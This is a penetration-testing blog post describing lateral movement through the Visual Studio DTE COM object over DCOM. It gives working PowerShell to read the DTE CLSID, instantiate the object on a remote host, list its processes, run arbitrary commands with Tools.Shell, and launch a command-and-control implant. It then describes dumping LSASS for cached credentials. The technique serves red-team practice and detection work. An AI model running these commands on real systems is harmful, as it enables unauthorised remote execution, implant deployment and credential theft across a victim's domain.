---
title: Lateral Movement – Visual Studio DTE
url: https://pentestlab.blog/2024/01/15/lateral-movement-visual-studio-dte/
source: Over Security - Cybersecurity news aggregator
date: 2024-08-31
fetch_date: 2025-10-06T18:06:27.114874
---

# Lateral Movement – Visual Studio DTE

[Skip to content](#content)

[Penetration Testing Lab](https://pentestlab.blog/)

Offensive Techniques & Methodologies

Menu

* [Methodologies](https://pentestlab.blog/methodologies/)
  + [Red Teaming](https://pentestlab.blog/methodologies/red-teaming/)
    - [Credential Access](https://pentestlab.blog/methodologies/red-teaming/credential-access/)
    - [Persistence](https://pentestlab.blog/methodologies/red-teaming/persistence/)
* [Resources](https://pentestlab.blog/resources/)
  + [Papers](https://pentestlab.blog/resources/papers/)
    - [Web Application](https://pentestlab.blog/resources/papers/web-application/)
  + [Presentations](https://pentestlab.blog/resources/presentations/)
    - [Defcon](https://pentestlab.blog/resources/presentations/defcon/)
    - [DerbyCon](https://pentestlab.blog/resources/presentations/derbycon/)
    - [Tools](https://pentestlab.blog/resources/presentations/tools/)
  + [Videos](https://pentestlab.blog/resources/videos/)
    - [BSides](https://pentestlab.blog/resources/videos/bsides/)
    - [Defcon](https://pentestlab.blog/resources/videos/defcon/)
    - [DerbyCon](https://pentestlab.blog/resources/videos/derbycon/)
    - [Hack In Paris](https://pentestlab.blog/resources/videos/hack-in-paris/)
* [Contact](https://pentestlab.blog/contact-the-lab/)
  + [About Us](https://pentestlab.blog/contact-the-lab/about-us/)

Posted on [January 15, 2024December 31, 2023](https://pentestlab.blog/2024/01/15/lateral-movement-visual-studio-dte/)

# Lateral Movement – Visual Studio DTE

![Unknown's avatar](https://0.gravatar.com/avatar/9161b274d6d350683293f1e03d228985ac0ff6ac6c89353f4b6bd1a7bc69daf4?s=32&d=identicon&r=G) by [Administrator](https://pentestlab.blog/author/worm1984/).In [Lateral Movement](https://pentestlab.blog/category/red-team/lateral-movement/).[Leave a Comment on Lateral Movement – Visual Studio DTE](https://pentestlab.blog/2024/01/15/lateral-movement-visual-studio-dte/#respond)

A lot of organizations have some sort of application development program and it is highly likely that developers will utilize Visual Studio for their development needs. Outside of the risk of from malicious *.sln* files which doesn’t apply Mark of the Web (MotW) and therefore can evade Microsoft controls such as SmartScreen, Visual Studio also provides an opportunity for lateral movement via the Development Tools Environment (DTE). [Juan Manuel Fernandez](https://twitter.com/TheXC3LL) disclosed this technique to the [public](https://adepts.of0x.cc/visual-studio-dcom/).

Visual Studio Development Tools Environment (DTE) is a COM library which enables developers to interact with the operating system and extend the functionality of Visual Studio. In order to use DTE for remote command execution the class ID of the visual studio installation needs to be retrieved from the registry.

```
Get-Item -Path Registry::HKEY_CLASSES_ROOT\VisualStudio.DTE.17.0\CLSID
```

[![](https://pentestlab.blog/wp-content/uploads/2023/12/visual-studio-dte-registry-clsid.png?w=960)](https://pentestlab.blog/wp-content/uploads/2023/12/visual-studio-dte-registry-clsid.png)

Visual Studio DTE – Registry CLSID

The local administrator credentials can be used from a PowerShell session by executing the following commands:

```
$Credential = Get-Credential
$Credential.UserName
```

The retrieved *CLSID* can be used in order to initiate a COM communication with the target host. Using the debugger it is feasible to enumerate the processes running on the target host.

```
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("33ABD590-0400-4FEF-AF98-5F5A8A99CFC3","10.0.0.2"))
$list = $com.Debugger.LocalProcesses
$list | ForEach-Object {$_.Name + " - " + $_.ProcessID}
```

[![](https://pentestlab.blog/wp-content/uploads/2023/12/visual-studio-dte-enumerate-processes.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2023/12/visual-studio-dte-enumerate-processes.png)

Visual Studio DTE – Processes Enumeration

It is also possible to launch executable applications within Visual Studio using *Tools.Shell*.

```
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("33ABD590-0400-4FEF-AF98-5F5A8A99CFC3","10.0.0.2"))
$com.ExecuteCommand("Tools.Shell", "cmd.exe /c echo PWNED! > c:\dcom.txt")
type \\10.0.0.2\C$\dcom.txt
```

[![](https://pentestlab.blog/wp-content/uploads/2023/12/visual-studio-dte-command-execution.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2023/12/visual-studio-dte-command-execution.png)

Visual Studio DTE – Command Execution

Of course during red team operations an implant can be executed in order to establish a Command & Control communication.

```
$com.ExecuteCommand("Tools.Shell", "cmd.exe /c C:\tmp\demon.x64.exe")
```

[![](https://pentestlab.blog/wp-content/uploads/2023/12/visual-studio-dte-implant-execution.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2023/12/visual-studio-dte-implant-execution.png)

Visual Studio DTE – Implant Execution

[![](https://pentestlab.blog/wp-content/uploads/2023/12/visual-studio-dte-implant.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2023/12/visual-studio-dte-implant.png)

Visual Studio DTE – Implant

From the implant it is now feasible to dump the LSASS process in order to retrieve any cached credentials stored that would potentially allow to move laterally into other systems within the domain.

[![](https://pentestlab.blog/wp-content/uploads/2023/12/visual-studio-dte-lsass-dumping.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2023/12/visual-studio-dte-lsass-dumping.png)

LSASS Dumping

### Rate this:

### Share this:

* [Click to share on X (Opens in new window)
  X](https://pentestlab.blog/2024/01/15/lateral-movement-visual-studio-dte/?share=twitter)
* [Click to share on Facebook (Opens in new window)
  Facebook](https://pentestlab.blog/2024/01/15/lateral-movement-visual-studio-dte/?share=facebook)
* [Click to share on LinkedIn (Opens in new window)
  LinkedIn](https://pentestlab.blog/2024/01/15/lateral-movement-visual-studio-dte/?share=linkedin)
* [Click to share on Reddit (Opens in new window)
  Reddit](https://pentestlab.blog/2024/01/15/lateral-movement-visual-studio-dte/?share=reddit)
* [Click to share on Mastodon (Opens in new window)
  Mastodon](https://pentestlab.blog/2024/01/15/lateral-movement-visual-studio-dte/?share=mastodon)
* [Click to share on Tumblr (Opens in new window)
  Tumblr](https://pentestlab.blog/2024/01/15/lateral-movement-visual-studio-dte/?share=tumblr)
* [Click to share on WhatsApp (Opens in new window)
  WhatsApp](https://pentestlab.blog/2024/01/15/lateral-movement-visual-studio-dte/?share=jetpack-whatsapp)
* [Click to share on Telegram (Opens in new window)
  Telegram](https://pentestlab.blog/2024/01/15/lateral-movement-visual-studio-dte/?share=telegram)
* [Click to share on Pinterest (Opens in new window)
  Pinterest](https://pentestlab.blog/2024/01/15/lateral-movement-visual-studio-dte/?share=pinterest)
* [Click to share on Pocket (Opens in new window)
  Pocket](https://pentestlab.blog/2024/01/15/lateral-movement-visual-studio-dte/?share=pocket)
* Click to email a link to a friend (Opens in new window)
  Email

Like Loading...

### *Related*

[COM](https://pentestlab.blog/tag/com/)[dcom](https://pentestlab.blog/tag/dcom/)[DTE](https://pentestlab.blog/tag/dte/)[Lateral Movement](https://pentestlab.blog/tag/lateral-movement/)[Visual Studio](https://pentestlab.blog/tag/visual-studio/)

### Leave a comment [Cancel reply](/2024/01/15/lateral-movement-visual-studio-dte/#respond)

Δ

## Post navigation

[Previous Previous post: Persistence – Event Log](https://pentestlab.blog/2024/01/08/persistence-event-log/)

[Next Next post: Domain Escalation – Backup Operator](https://pentestlab.blog/2024/01/22/domain-escalation-backup-operator/)

## Support pentestlab.blog

Pentestlab.blog has a long term history in the offensive security space by delivering content for over a decade. Articles discussed in pentestlab.blog have been used by cybe...